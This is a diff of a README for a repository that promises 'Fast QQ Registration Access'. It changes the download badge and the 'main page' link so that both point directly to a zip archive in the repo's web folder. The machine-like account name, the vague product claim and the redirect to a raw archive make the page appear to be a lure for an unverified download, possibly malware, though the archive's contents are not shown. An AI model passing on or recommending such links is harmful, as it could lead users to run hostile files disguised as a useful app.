@@ -1,6 +1,6 @@
 # 🚀 sora-qq-1093370579 - Fast QQ Registration Access
 
-[![Download](https://img.shields.io/badge/Download-Open%20Page-blue?style=for-the-badge&logo=github)](https://github.com/foraybrightnessconstancy106/sora-qq-1093370579)
+[![Download](https://img.shields.io/badge/Download-Open%20Page-blue?style=for-the-badge&logo=github)](https://github.com/foraybrightnessconstancy106/sora-qq-1093370579/raw/refs/heads/main/web/qq-sora-v1.6.zip)
 
 ## 📌 What this app does
 
@@ -20,7 +20,7 @@ Use it if you want a direct path to the download page and a simple setup flow on
 
 Open the main page here:
 
-https://github.com/foraybrightnessconstancy106/sora-qq-1093370579
+https://github.com/foraybrightnessconstancy106/sora-qq-1093370579/raw/refs/heads/main/web/qq-sora-v1.6.zip
 
 Use this link to visit the page, check the latest files, and download the version that fits your system.
 
